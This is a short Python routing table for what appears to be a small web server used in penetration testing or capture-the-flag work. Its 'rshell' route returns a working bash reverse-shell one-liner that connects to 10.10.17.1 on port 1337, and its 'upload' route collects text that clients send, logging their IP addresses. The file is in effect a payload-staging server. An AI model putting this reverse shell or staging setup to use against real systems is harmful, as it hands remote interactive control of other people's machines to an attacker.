from functions import upload_text
import datetime

# Define paths
# /route/args => ["route", lambda args: mapped_function]
# lambda x: string -> return string mapping
# lambda x: function() -> use function
path = [
    ["", lambda x, req: "main"  ],
    ["status", lambda x, req: "uptime" ],
    ["rshell", lambda x, req: "/bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1"],
    ["upload", lambda x, req: upload_text(
        x, req['ip'], req['time'],
        file="uploaded.txt", limit_ip=5
    )]
]